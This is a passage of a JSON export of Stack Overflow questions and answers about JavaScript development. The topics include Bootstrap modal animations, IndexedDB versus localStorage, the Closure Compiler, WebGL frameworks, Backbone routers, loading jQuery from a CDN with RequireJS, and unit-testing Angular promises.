                    "body": "<p>Just take out the <code>fade</code> class from the modal div.</p>\n\n<p>Specifically, change:</p>\n\n<pre><code>&lt;div class=\"modal fade hide\"&gt;\n</code></pre>\n\n<p>to:</p>\n\n<pre><code>&lt;div class=\"modal hide\"&gt;\n</code></pre>\n\n<hr>\n\n<p><strong>UPDATE:</strong> For bootstrap3, the <code>hide</code> class is not needed.</p>\n",
                    "is_accepted": true,
                    "score": 217
                },
                {
                    "body": "<p>If you like to have the modal fade in rather than slide in (why is it called <code>.fade</code> anyway?) you can overwrite the class in your CSS file or directly in <code>bootstrap.css</code> with this:</p>\n\n<pre><code>.modal.fade{\n    -webkit-transition: opacity .2s linear, none;\n    -moz-transition: opacity .2s linear, none;\n    -ms-transition: opacity .2s linear, none;\n    -o-transition: opacity .2s linear, none;\n    transition: opacity .2s linear, none;\n    top: 50%;\n}\n</code></pre>\n\n<p>If you don't want any effect just remove the <code>fade</code> class from the modal classes. </p>\n",
                    "is_accepted": false,
                    "score": 27
                },
                {
                    "body": "<p>I solved this by overriding the default <code>.modal.fade</code> styles in my own LESS stylesheet:</p>\n\n<pre><code>.modal {\n  &amp;.fade {\n    .transition(e('opacity .3s linear'));\n    top: 50%;\n  }\n  &amp;.fade.in { top: 50%; }\n}\n</code></pre>\n\n<p>This keeps the fade in / fade out animation but removes the slide up / slide down animation.</p>\n",
                    "is_accepted": false,
                    "score": 19
                },
                {
                    "body": "<p>I didn't like the slide effect either. To fix this all you have to do is make the the <code>top</code> attribute the same for both .modal.fade and modal.fade.in. You can take off the <code>top 0.3s ease-out</code> in the transitions too, but it doesn't hurt to leave it in. <strong>I like this approach because the fade in/out works, it just kills the slide</strong>.</p>\n\n<pre><code>.modal.fade {\n  top: 20%;\n  -webkit-transition: opacity 0.3s linear;\n     -moz-transition: opacity 0.3s linear;\n       -o-transition: opacity 0.3s linear;\n          transition: opacity 0.3s linear;\n}\n\n.modal.fade.in {\n  top: 20%;\n}\n</code></pre>\n\n<p>If you're looking for a bootstrap 3 answer, <a href=\"http://stackoverflow.com/questions/10143444/twitter-bootstrap-modal-how-to-remove-slide-down-effect/19777522#19777522\">look here</a></p>\n",
                    "is_accepted": false,
                    "score": 11
                },
                {
                    "body": "<p>you can also overwrite bootstrap.css by simply removing \"top:-25%;\"</p>\n\n<p>once removed, the modal will simply fade in and out without the slide animation.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I believe that most of these answers are for bootstrap 2. I ran into the same issue for bootstrap 3 and wanted to share my fix. Like my previous answer for bootstrap 2, this will still do an opacity fade, but will <strong>NOT</strong> do the slide transition.</p>\n\n<p>You can either change the modals.less or the theme.css files, depending on your workflow. If you haven't spent any quality time with less, I'd highly recommend it. </p>\n\n<p>for less, find the following code in <code>MODALS.less</code> </p>\n\n<pre><code>&amp;.fade .modal-dialog {\n  .translate(0, -25%);\n  .transition-transform(~\"0.3s ease-out\");\n}\n&amp;.in .modal-dialog { .translate(0, 0)}\n</code></pre>\n\n<p>then change the <code>-25%</code> to <code>0%</code></p>\n\n<p>Alternatively, if you're using just the css, find the following in <code>theme.css</code>:</p>\n\n<pre><code>.modal.fade .modal-dialog {\n  -webkit-transform: translate(0, -25%);\n  -ms-transform: translate(0, -25%);\n  transform: translate(0, -25%);\n  -webkit-transition: -webkit-transform 0.3s ease-out;\n  -moz-transition: -moz-transform 0.3s ease-out;\n  -o-transition: -o-transform 0.3s ease-out;\n  transition: transform 0.3s ease-out;\n}\n</code></pre>\n\n<p>and then change the <code>-25%</code> to <code>0%</code>.</p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>Wanted to update this. Most of you have not completed this issue. I'm using Bootstrap 3. none of the fixes above worked. </p>\n\n<p>to remove the slide effect but keep the fade in. I went into bootstrap css and (noted out the following selectors) - this resolved the issue.</p>\n\n<pre><code> .modal.fade .modal-dialog{/*-webkit-transform:translate(0,-25%);-ms-transform:translate(0,-25%);transform:translate(0,-25%);-webkit-transition:-webkit-transform .3s ease-out;-moz-transition:-moz-transform .3s ease-out;-o-transition:-o-transform .3s ease-out;transition:transform .3s ease-out*/}\n\n .modal.in .modal-dialog{/*-webkit-transform:translate(0,0);-ms-transform:translate(0,0);transform:translate(0,0)*/}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I'm working with bootstrap 3 and the Durandal JS 2 modal plugin. This question was on top of Google results and as none of the answers above is working for me I thought I'd share my solution for future visitors.</p>\n\n<p>I override the default Bootstrap's Less code with this in my own less:</p>\n\n<pre><code>.modal {\n  &amp;.fade .modal-dialog {\n    .translate(0, 0);\n    .transition-transform(~\"none\");\n  }\n  &amp;.in .modal-dialog { .translate(0, 0)}\n}\n</code></pre>\n\n<p>That way I am left with only the fade effect, and no slideDown.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I have found the best solution that <strong>removes the slide but leaves the fade</strong> is by adding the following css in a css file of your chosing which is invoked after the bootstrap.css</p>\n\n<pre><code>.modal.fade .modal-dialog \n{\n    -moz-transition: none !important;\n    -o-transition: none !important;\n    -webkit-transition: none !important;\n    transition: none !important;\n\n    -moz-transform: none !important;\n    -ms-transform: none !important;\n    -o-transform: none !important;\n    -webkit-transform: none !important;\n    transform: none !important;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<pre><code>.modal.fade, .modal.fade .modal-dialog {\n    -webkit-transition: none;\n    -moz-transition: none;\n    -ms-transition: none;\n    -o-transition: none;\n    transition: none;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Is there a way to change the Twitter Bootstrap Modal window animation from a slide down effect to a fadeIn or just display without the Slide? I read through the documentation here:</p>\n\n<p><a href=\"http://getbootstrap.com/javascript/#modals\">http://getbootstrap.com/javascript/#modals</a></p>\n\n<p>But they don't mention any options for changing the modal body slide effects.</p>\n",
            "last_activity_date": 1420975118,
            "question_id": 10143444,
            "score": 95,
            "tags": [
                "javascript",
                "jquery",
                "jquery-ui",
                "twitter-bootstrap"
            ],
            "title": "Twitter Bootstrap modal: How to remove Slide down effect"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>IndexedDB is not a key-value store in the same way that Local Storage is.  Local storage just stores strings, so to put an object in local storage the usual approach is to <a href=\"https://developer.mozilla.org/En/Using_JSON_in_Firefox\">JSON.stringify</a> it:</p>\n\n<pre><code>myObject = {a: 1, b: 2, c: 3};\nlocalStorage.setItem(\"uniq\", JSON.stringify(myObject));\n</code></pre>\n\n<p>This is fine for finding the object with key <code>uniq</code>, but the only way to get the properties of myObject back out of local storage is to JSON.parse the object and examine it:</p>\n\n<pre><code>var myStorageObject = JSON.parse(localStorage.getItem(\"uniq\"));\nwindow.alert(myStorageObject.b);\n</code></pre>\n\n<p>This is fine if you only have one, or a few objects, in local storage.  But imagine you have a thousand objects, all of which have a property <code>b</code>, and you want to do something just with those ones where <code>b==2</code>.  With local storage you'll have to loop through the entire store and check <code>b</code> on each item, which is a lot of wasted processing.</p>\n\n<p>With IndexedDB you can store <a href=\"http://www.w3.org/TR/IndexedDB/#value-construct\">stuff other than strings in the value</a>: \"This includes simple types such as DOMString and Date as well as Object and Array instances.\"  Not only that, but you can <a href=\"http://www.w3.org/TR/IndexedDB/#index-concept\">create indexes</a> on properties of the objects that you stored in the value.  So with IndexedDb you can put those same thousand objects in it but create an index on the <code>b</code> property and use that to just retrieve the objects where <code>b==2</code> without the overhead of scanning every object in the store.</p>\n\n<p>At least that's the idea.  The IndexedDB API isn't very intuitive.</p>\n\n<blockquote>\n  <p>They appear to run in the same thread as the async calls were made. How will this not block the UI?</p>\n</blockquote>\n\n<p>Asynchronous is not the same thing as multi-threaded, <a href=\"http://stackoverflow.com/questions/39879/why-doesnt-javascript-support-multithreading\">JavaScript, as a rule, is not multi-threaded</a>.  Any heavy processing you do in JS will block the UI, if you want to minimize blocking the UI try <a href=\"http://www.whatwg.org/specs/web-workers/current-work/\">Web Workers</a>.</p>\n\n<blockquote>\n  <p>indexedDB allows a larger store. Why not increase the size of the HTML5 store?</p>\n</blockquote>\n\n<p>Because, without proper indexing, it would get increasingly slower the larger it got.</p>\n",
                    "is_accepted": true,
                    "score": 59
                },
                {
                    "body": "<p>Adding to the anwser of robertc, indexedDB knows 'ranges' so you can search and retrieve all records that start with 'ab' and end with abd' to find 'abc' etc.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<ol>\n<li>Both indexedDB and local storage are key value stores. What is the\nadvantage of having two key/value stores?</li>\n<li>indexedDB is asynchronous, but joins (the most time-consuming thing)\n    are manual. They appear to run in the same thread as the async calls\n    were made. How will this not block the UI?</li>\n<li>indexedDB allows a larger store. Why not increase the size of the\n        HTML5 store?      </li>\n<li>I'm scratching my head. What is the point of indexedDB?</li>\n</ol>\n",
            "last_activity_date": 1404257992,
            "question_id": 5924485,
            "score": 41,
            "tags": [
                "javascript",
                "html5",
                "indexeddb"
            ],
            "title": "How is indexedDB conceptually different from HTML5 local storage?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>How about google's own service:\n<a href=\"http://closure-compiler.appspot.com/home\">http://closure-compiler.appspot.com/home</a></p>\n\n<p>I should point out that \"setting up the entire project on my own\" really is not half as scary as you make it out to be :p. </p>\n\n<p>I mean, it's a matter of downloading a java.jar and running it. Instructions:</p>\n\n<ol>\n<li>Download at <a href=\"http://closure-compiler.googlecode.com/files/compiler-latest.zip\">http://closure-compiler.googlecode.com/files/compiler-latest.zip</a></li>\n<li>Unzip</li>\n<li><p>run java command line:</p>\n\n<p><code>java -jar compiler.jar --js script-src.js --js_output_file script-compiled.js</code></p></li>\n</ol>\n\n<p>where <code>&lt;compiler.jar&gt;</code> is the full location to the <code>compiler.jar</code> file in the downloaded archive, <code>script-src.js</code> is the full filename of the source file, and <code>script-compiled.js</code> is the full filename of the result.</p>\n",
                    "is_accepted": true,
                    "score": 86
                },
                {
                    "body": "<p>Google offers the Closure Compiler via REST API, which you can invoke from a shell</p>\n\n<p><a href=\"https://developers.google.com/closure/compiler/docs/gettingstarted_api\" rel=\"nofollow\">https://developers.google.com/closure/compiler/docs/gettingstarted_api</a></p>\n\n<pre><code>curl -v \\\n    -d code_url=http://server/js/file-big.js \\\n    -d compilation_level=ADVANCED_OPTIMIZATIONS \\\n    -d output_info=compiled_code \\\n    -d output_format=text \\\n    http://closure-compiler.appspot.com/compile \\\n    &gt; radix.min.js\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Has anyone setup an online copy/paste utility for Google's Closure minifier? I'm working on a project and I want to minify part of the code manually without having to setup the entire project on my own.</p>\n",
            "last_activity_date": 1366317355,
            "question_id": 2030671,
            "score": 41,
            "tags": [
                "javascript",
                "minify",
                "google-closure"
            ],
            "title": "Google Closure minifier online?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>This is basically a duplicate of <a href=\"http://stackoverflow.com/questions/3890183/webgl-framework\">WebGL Framework</a>, but the answers have probably changed since then. See also <a href=\"http://stackoverflow.com/questions/5301967/which-webgl-framework-should-i-learn\">Which WebGL framework should i learn?</a></p>\n\n<p>Since the world of WebGL is developing so fast right now, it would be difficult to find a complete, up-to-date comparison of WebGL frameworks. As soon as somebody spent the time researching such a thing, it would be obsolete. But here is an annotated list of WebGL frameworks:</p>\n\n<p><a href=\"http://www.khronos.org/webgl/wiki/User_Contributions\">http://www.khronos.org/webgl/wiki/User_Contributions</a></p>\n\n<p>If you start a project using one of these frameworks, and then if you update this list based on your experience, it will be more up to date than before.</p>\n\n<p>By the way in looking just now at <a href=\"http://senchalabs.github.com/philogl/\">PhiloGL</a>, I was impressed with the full set of API docs, and that they've ported all the WebGL lessons to use PhiloGL (source code only, no explanatory text). I don't see a tutorial per se; but they have several examples, so overall they're better off than three.js in regard to documentation.</p>\n\n<p>A few more notes, for those who may come after (including myself):</p>\n\n<ul>\n<li>CopperLicht seems to major on loading models from files, as opposed to generating geometry in code. It is not open source.</li>\n<li>PhiloGL uses O3D for generating geometry, e.g. spheres.</li>\n<li>Three.js comes with commonly-used textures.</li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>I often use the popularity of a project on GitHub as an indicator of its success. While there are problems with this method, I do find it's often the best way to make a choice. Listing popular WebGL projects, in decreasing popularity by number of \"stars\":</p>\n\n<ul>\n<li><a href=\"https://github.com/mrdoob/three.js/\" rel=\"nofollow\">ThreeJS</a> (15339)</li>\n<li><a href=\"https://github.com/senchalabs/philogl\" rel=\"nofollow\">PhiloGL</a> (565)</li>\n<li><a href=\"https://github.com/supereggbert/GLGE\" rel=\"nofollow\">GLGE</a> (342)</li>\n<li><a href=\"https://github.com/xeolabs/scenejs\" rel=\"nofollow\">SceneJS</a> (306)</li>\n<li><a href=\"https://github.com/cedricpinson/osgjs\" rel=\"nofollow\">OSGJS</a> (170)</li>\n<li><a href=\"https://github.com/cathyatseneca/c3dl\" rel=\"nofollow\">C3DL</a> (45)</li>\n</ul>\n\n<p>This also mirrors what I've found when looking into these projects. three.js seems to be the most feature complete, has an extensive set of examples, a well-structured code base, and a thriving community.</p>\n",
                    "is_accepted": false,
                    "score": 30
                },
                {
                    "body": "<p>As SceneJS author I thought I'd throw this in if it helps: SceneJS is specialised towards fast rendering of large numbers of individually articulated objects, without game engine effects like shadows, reflections etc. </p>\n\n<p>In other words it's aimed at requirements of CAD, medical anatomy, engineering visualisations, things with 1000's of nuts and bolts, organs etc.</p>\n\n<p>It therefore has less flexibility than three.js, GLGE and PhiloGL.</p>\n\n<p>It does however have a pure JSON API, which people have found integrates well with AJAX, parsers and databases (eg CouchDB). </p>\n\n<p>So if you're writing a game I would point you at one of the other frameworks, but if you're writing a CAD viewer then SceneJS might do the trick.</p>\n",
                    "is_accepted": true,
                    "score": 70
                },
                {
                    "body": "<p>I'm the author of Jax ( <a href=\"http://blog.jaxgl.com/what-is-jax\" rel=\"nofollow\">http://blog.jaxgl.com/what-is-jax</a> ), a framework with emphasis on test-driven, behavior-driven development and sheer productivity. Jax offers powerful code generators, an integrated application server and testing environment, and a cleanly-organized MVC (Model, View, Controller) architecture for your WebGL application.</p>\n\n<p>Jax is designed first and foremost around Getting Stuff Done. It's a convention-over-configuration framework, which means that -- while you can certainly <em>make</em> it do things however you like -- if you accept its conventions, you'll find there's very little up-front cost to getting your application off the ground.</p>\n\n<p>In addition, Jax was designed around extensibility. It's easy to build meshes with whatever data set or algorithms you prefer to use, from loading them via JSON to generating them on the vertex shader; and the framework sports an honest-to-goodness plugin system so you can pick and choose additional functionality (such as collision detection) based on the needs of your application, without bloating the framework with things you don't care about.</p>\n\n<p>It has loads of documentation and I'm adding more every chance I get; the quick-start page is now online at <a href=\"http://jaxgl.com\" rel=\"nofollow\">http://jaxgl.com</a>, and a set of comprehensive guides are slowly making their way to <a href=\"http://guides.jaxgl.com\" rel=\"nofollow\">http://guides.jaxgl.com</a>. Links to the API documentation are available there, as well.</p>\n\n<p>A growing selection of live demos of Jax in action are also alive and well on Github: <a href=\"http://sinisterchipmunk.github.com\" rel=\"nofollow\">http://sinisterchipmunk.github.com</a>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Pros and cons anyone? Couldn\u2019t find a complete feature set for three.js library. Though I do know it\u2019s popular and in active development. Maybe someone have done some R&amp;D on WebGL engines and can suggest which benefits each library gives?</p>\n",
            "last_activity_date": 1421228434,
            "question_id": 6762726,
            "score": 38,
            "tags": [
                "javascript",
                "webgl"
            ],
            "title": "SceneJS vs Three.JS vs others"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>i wrote an app (still writing) with multiple routers in it.\nhowever it is not like you think, it is more module based and not a router per view or anything like that.</p>\n\n<p>for example,\nsay i got two big modules in my app,  1 handling all books, and 1 for the users.\nbooks have multiple views (as do users), a list view, detail view, edit view, etc etc...\nso each module has its own router,\nwhich stands for its own set of urls:</p>\n\n<pre><code>// user module...\nvar userRouter = Backbone.Router.extend({\n    routes: {\n        \"users\": \"loadUsers\",\n        \"users/add\": \"addUser\",\n        \"user/:id\": \"loadUser\",\n        \"user/:id/edit\": \"editUser\"\n    }\n\n// ... rest dropped to save the trees (you never know if someone prints this out)\n});\n\n\n// book module\nvar bookRouter = Backbone.Router.extend({\n    routes: {\n        \"books\": \"loadBooks\",\n        \"books/add\": \"addBook\",\n        \"book/:name\": \"loadBook\",\n        \"book/:name/edit\": \"editBook\"\n    }\n\n// ... rest dropped to save the trees (you never know if someone prints this out)\n});\n</code></pre>\n\n<p>so, it is not like my two routers are competing for the same route, they each handle their own set of routes.</p>\n\n<p><strong>edit</strong>\nnow that I had more info via Elf Sternberg, I know it isn't possible by default to have multiple routers match on the same route. without a workaround like overriding the backbone history or using namespaces in routes and regexes to match these routes. \nmore info here: <a href=\"http://stackoverflow.com/questions/5223251/multiple-matching-routes/\">multiple matching routes</a> \nthanks Elf Sternberg for the link.</p>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p>I just wrote a blog post on Module-Specific Subroutes in Backbone, which allow a \"subroute\" to be defined which pays attention to everything <em>after</em> the prefix for that route.  </p>\n\n<p>Check out the blog entry for more explanation: <a href=\"http://www.geekdave.com/?p=13\">http://www.geekdave.com/?p=13</a></p>\n\n<p>This means you don't have to redundantly define the same prefix over and over, and you can also lazy-load subroutes as modules are accessed.  Feedback is most welcome!</p>\n",
                    "is_accepted": false,
                    "score": 19
                },
                {
                    "body": "<p>There is a limited but important case when it makes sense to use multiple Routers. If you need to expose only a subset of your application's routes &amp; views based on data collected at runtime (perhaps login credentials - e.g., manager vs. staff can see &amp; navigate between different sets of views) you could instantiate only the appropriate Router &amp; View classes. This is significant because routes can be bookmarked and sent from user to user. Of course, you still need checks on the server to ensure that an unauthorized user isn't issuing requests after navigating to a view they arrived at via a bookmark sent by an authorized user. But it's better to design the application so the unauthorized view is just not generated.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>All example on backbone using one router for the whole application. But wouldn't it make sense to have a router for single part of your app (header, footer, stage, sidebar). So my question is has anyone build apps with more than one router and what are experience.</p>\n\n<p>Lets think about a complex app with nested views. Wouldn't it be better when a view have an own router that handle the display of the subviews, than having one big router that have to inform the main view to change his sub views?</p>\n\n<p>The background of this question: I've see a lot of parallels of the router in backbone and the ActivityMapper in GWT. The ActivityMapper is only responsible to get the right presenter for a given route and a given container in the DOM. </p>\n",
            "last_activity_date": 1416218942,
            "question_id": 8362230,
            "score": 35,
            "tags": [
                "javascript",
                "architecture",
                "backbone.js",
                "router"
            ],
            "title": "Multiple routers vs single router in BackboneJs"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You can include it as a dependency for a module but it's a little flakey. e.g</p>\n\n<pre><code>define([\n\"order!http://code.jquery.com/jquery-1.7.min.js\"\n], function($) {\n})\n</code></pre>\n\n<p>It's not so good for 2 reasons</p>\n\n<p>1) the jquery file itself isn't a module so the <code>$</code> you get from the function won't be jquery</p>\n\n<p>2) the <code>order!</code> plugin doesn't work well with CDN versions of scripts.  See <a href=\"http://stackoverflow.com/questions/6135259/requirejs-order-does-not-work-with-priority-config-and-cdn-dependencies\">Requirejs&#39; order does not work with priority config and CDN dependencies</a></p>\n\n<p>I haven't had the chance to use this in a 'real' project yet because we haven't upgraded yet, but from my tests i've found that the best way is to include jquery in a script tag, then it works great as a dependency to your modules.  Hopefully the following small sample will be helpful:</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Index2&lt;/title&gt;\n    &lt;script src=\"../../scripts/libraries/jquery.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n    &lt;script src=\"../../scripts/libraries/require.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\"\"&gt;\n\n        require(\n            {baseUrl: 'scripts'}, \n            ['jquery'], \n            function (dollarSign) {\n                console.log(dollarSign('div').html('hi'));\n            });       \n    &lt;/script&gt;\n\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div&gt;\n\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>jQuery 1.7 registers itself as an AMD module by the name of 'jquery', so you need to create a mapping for 'jquery' using the paths config:</p>\n\n<pre><code>requirejs.config({\n  paths: {\n    'jquery' : 'https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min'\n  }\n});\n\nrequire(['jquery'], function($) {\n  //$ points to jQuery\n});\n</code></pre>\n\n<p>Note however that RequireJS loads modules asynchronously and <strong>out of order</strong>, so if you have jQuery plugins you want to use that are not wrapped in <code>define(['jquery'], function ($){ /* plugin code goes here */ });</code> calls, the plugin could execute before jQuery is loaded.</p>\n\n<p>See the <a href=\"https://github.com/jrburke/require-jquery\" rel=\"nofollow\">require-jquery</a> project's README on ways to deal with files that depend on jQuery but do not wrap themselves in <code>define()</code> calls.</p>\n",
                    "is_accepted": true,
                    "score": 41
                },
                {
                    "body": "<p>@jrburke's answer does not work for me. According to the <a href=\"http://requirejs.org/docs/api.html#config-paths\">RequireJS api doc</a>, you should not include the file extension in the path. So here is the working code:</p>\n\n<pre><code>requirejs.config({\n    paths: {\n        'jquery': 'https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min'\n    }\n});\n\nrequire(['jquery'], function($) {\n    //$ points to jQuery\n});\n</code></pre>\n\n<p>I have a working example on jsfiddle:\n<a href=\"http://jsfiddle.net/murrayju/FdKTn/\">http://jsfiddle.net/murrayju/FdKTn/</a></p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>First of all, it's recommend use <a href=\"http://www.paulirish.com/2010/the-protocol-relative-url/\" rel=\"nofollow\">Protocol-relative URL</a> for jQuery CDN.\nAnd second, use array in value with CDN and local places for load local file if CND is dead. You can use as many CDNs urls you want. Do not afraid, it dosn't want load second file from local place if successfully download it from CDN.</p>\n\n<pre><code>requirejs.config({\n  paths: {\n    'jquery': ['//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min', 'lib/jquery-1.10.2.min']\n  }\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am using require JS and want to know the best method to use a CDN version of jQuery. I hear the 1.7 version is \"AMD\" which is supposed to help but can't find a straight example. Hope some RequireJS gurus can help me out.</p>\n",
            "last_activity_date": 1390224936,
            "question_id": 8070959,
            "score": 33,
            "tags": [
                "javascript",
                "jquery",
                "cdn",
                "requirejs"
            ],
            "title": "Sourcing jQuery from a CDN?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>You will still need to mock the services and return a promise, but you should use real promises instead, so you don't need to implement its functionality. Use <code>beforeEach</code> to create the already fulfilled promise and mock the service if you need it to ALWAYS be resolved.</p>\n\n\n\n<pre class=\"lang-js prettyprint-override\"><code>var $rootScope;\n\nbeforeEach(inject(function(_$rootScope_, $q) {\n  $rootScope = _$rootScope_;\n\n  var deferred = $q.defer();\n  deferred.resolve('somevalue'); //  always resolved, you can do it from your spec\n\n  // jasmine 2.0\n  spyOn(tasksService, 'removeAndGetNext').and.returnValue(deferred.promise); \n\n  // jasmine 1.3\n  //spyOn(tasksService, 'removeAndGetNext').andReturn(deferred.promise); \n\n}));\n</code></pre>\n\n<p>If you'd rather prefer to resolve it in each <code>it</code> block with a different value, then you just expose the deferred to a local variable and resolve it in the spec.</p>\n\n<p>Of course, you would keep your tests as they are, but here is some really simple spec to show you how it would work.</p>\n\n<pre class=\"lang-js prettyprint-override\"><code>it ('should test receive the fulfilled promise', function() {\n  var result;\n\n  tasksService.removeAndGetNext().then(function(returnFromPromise) {\n    result = returnFromPromise;\n  });\n\n  $rootScope.$apply(); // promises are resolved/dispatched only on next $digest cycle\n  expect(result).toBe('somevalue');\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 61
                },
                {
                    "body": "<p>Another approach would be the following, taken straight out of a controller I was testing:</p>\n\n<pre><code>var create_mock_promise_resolves = function (data) {\n    return { then: function (resolve) { return resolve(data); };\n};\n\nvar create_mock_promise_rejects = function (data) {\n    return { then: function (resolve, reject) { if (typeof reject === 'function') { return resolve(data); } };\n};\n\nvar create_noop_promise = function (data) {\n    return { then: function () { return this; } };\n};\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>And as yet another option you can avoid having to call <code>$digest</code>by using the Q library (<a href=\"https://github.com/kriskowal/q\" rel=\"nofollow\">https://github.com/kriskowal/q</a>) as a drop-in replacement for <code>$q</code> e.g:</p>\n\n<pre><code>beforeEach(function () {\n    module('Module', function ($provide) {\n        $provide.value('$q', Q); \n    });\n});\n</code></pre>\n\n<p>This way promises can be resolved/rejected outside of the $digest cycle.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm having hard times trying to test promise-based code in Angular.</p>\n\n<p>I have the following code in my controller:</p>\n\n<pre><code>    $scope.markAsDone = function(taskId) {\n        tasksService.removeAndGetNext(taskId).then(function(nextTask) {\n            goTo(nextTask);\n        })\n    };\n\n    function goTo(nextTask) {\n        $location.path(...);\n    }\n</code></pre>\n\n<p>I'd like to unit-test the following cases:</p>\n\n<ul>\n<li>when <code>markAsDone</code> is called it should call <code>tasksService.removeAndGetNext</code></li>\n<li>when <code>tasksService.removeAndGetNext</code> is done it should change location (invoke <code>goTo</code>)</li>\n</ul>\n\n<p>It seems to me that there is no easy way to test those two cases separately.</p>\n\n<p>What I did to test the first one was:</p>\n\n<pre><code>var noopPromise= {then: function() {}}\nspyOn(tasksService, 'removeAndGetNext').andReturn(noopPromise);\n</code></pre>\n\n<p>Now to test second case I need to create another fake promise that would be always <code>resolved</code>. It's all quite tedious and it's a lot of boilerplate code.</p>\n\n<p>Is there any other way to test such things? Or does my design smell?</p>\n",
            "last_activity_date": 1419849083,
            "question_id": 16081586,
            "score": 32,
            "tags": [
                "javascript",
                "angularjs",
                "promise"
            ],
            "title": "Unit-test promise-based code in Angular"
        }
    ]
}
